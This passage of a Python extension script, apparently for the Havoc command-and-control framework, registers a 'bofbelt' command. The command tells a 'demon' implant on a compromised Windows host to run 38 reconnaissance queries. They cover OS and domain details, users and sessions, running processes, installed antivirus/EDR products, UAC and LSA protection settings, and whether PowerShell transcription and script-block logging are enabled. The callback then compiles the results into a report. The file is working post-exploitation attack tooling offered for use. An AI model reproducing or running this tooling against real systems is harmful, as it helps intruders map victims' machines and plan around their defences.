            bof_output = json.load(f)
    except:
        bof_output = []

    # add the data for this BOF callback
    bof_output.append({
        'worked': worked,
        'TaskID': TaskID,
        'output': output,
        'error' : error
    })

    # save all the data
    with open(filename, 'w') as f:
        f.write(json.dumps(bof_output))

    # get how many BOFs have completed
    num_entries  = len(bof_output)

    # are we done?
    if num_entries == 38:
        os.remove(filename)
        bofbelt_report( demonID, bof_output )

    return True

def bofbelt( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    demon  = Demon( demonID )

    # Getting basic OS information
    reg_query_with_callback( demonID, bofbelt_callback, "HKLM", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName" )
    reg_query_with_callback( demonID, bofbelt_callback, "HKLM", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ReleaseId" )
    reg_query_with_callback( demonID, bofbelt_callback, "HKLM", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CurrentMajorVersionNumber" )
    reg_query_with_callback( demonID, bofbelt_callback, "HKLM", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CurrentVersion" )
    reg_query_with_callback( demonID, bofbelt_callback, "HKLM", "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CurrentBuildNumber" )
    env_with_callback( demonID, bofbelt_callback )
    ipconfig_with_callback( demonID, bofbelt_callback )
    wmi_query_with_callback( demonID, bofbelt_callback, "Select Domain from Win32_ComputerSystem" )
    wmi_query_with_callback( demonID, bofbelt_callback, "Select * from Win32_ComputerSystem" )
    uptime_with_callback( demonID, bofbelt_callback )
    reg_query_with_callback( demonID, bofbelt_callback, "HKLM", "SYSTEM\\CurrentControlSet\\Control\\Lsa", "RunAsPPL" )
    reg_query_with_callback( demonID, bofbelt_callback, "HKLM", "SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2\\Exe", "EnforcementMode" )

    # Getting User information

    whoami_with_callback( demonID, bofbelt_callback )

    # Getting PowerShell information

    bofdir_with_callback( demonID, bofbelt_callback, 'C:\\Windows\\Microsoft.Net\\Framework\\v1.0.3705\\System.dll' )
    bofdir_with_callback( demonID, bofbelt_callback, 'C:\\Windows\\Microsoft.Net\\Framework\\v1.1.4322\\System.dll' )
    bofdir_with_callback( demonID, bofbelt_callback, 'C:\\Windows\\Microsoft.Net\\Framework\\v2.0.50727\\System.dll' )
    bofdir_with_callback( demonID, bofbelt_callback, 'C:\\Windows\\Microsoft.Net\\Framework\\v3.0\\System.dll' )
    bofdir_with_callback( demonID, bofbelt_callback, 'C:\\Windows\\Microsoft.Net\\Framework\\v3.5\\System.dll' )
    bofdir_with_callback( demonID, bofbelt_callback, 'C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\System.dll' )
    reg_query_with_callback( demonID, bofbelt_callback, "HKLM", "SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellEngine", "PowerShellVersion" )
    reg_query_with_callback( demonID, bofbelt_callback, "HKLM", "SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine", "PowerShellVersion" )
    reg_query_with_callback( demonID, bofbelt_callback, "HKLM", "SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription", "EnableTranscripting" )
    reg_query_with_callback( demonID, bofbelt_callback, "HKLM", "SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription", "EnableInvocationHeader" )
    reg_query_with_callback( demonID, bofbelt_callback, "HKLM", "SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging", "EnableModuleLogging" )
    reg_query_with_callback( demonID, bofbelt_callback, "HKLM", "SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging", "EnableScriptBlockLogging" )
    reg_query_with_callback( demonID, bofbelt_callback, "HKLM", "SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging", "EnableScriptBlockInvocationLogging" )

    # Getting .NET information

    bofdir_with_callback( demonID, bofbelt_callback, 'C:\\Windows\\Microsoft.Net\\Framework\\' )
    reg_query_with_callback( demonID, bofbelt_callback, "HKLM", "SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v3.5", "Version" )
    reg_query_with_callback( demonID, bofbelt_callback, "HKLM", "SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full", "Version" )

    # Getting AVs/EDRs information

    wmi_query_with_callback( demonID, bofbelt_callback, "SELECT * FROM AntiVirusProduct", ".", "root\\SecurityCenter2" )

    # Getting information about the running processes

    tasklist_with_callback( demonID, bofbelt_callback )

    # Getting UAC information

    reg_query_with_callback( demonID, bofbelt_callback, "HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "ConsentPromptBehaviorAdmin" )
    reg_query_with_callback( demonID, bofbelt_callback, "HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA" )
    reg_query_with_callback( demonID, bofbelt_callback, "HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "LocalAccountTokenFilterPolicy" )
    reg_query_with_callback( demonID, bofbelt_callback, "HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "FilterAdministratorToken" )

    # Getting Local Users information
    userenum_with_callback( demonID, bofbelt_callback )

    # Getting Local Sessions information

    enumlocalsessions_with_callback( demonID, bofbelt_callback )

    # Getting Open windows information

    windowlist_with_callback( demonID, bofbelt_callback )

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to run Bofbelt" )

    return TaskID

RegisterCommand( bofbelt, "", "bofbelt", "A Seatbelt port using BOFs", 0, "", "" )
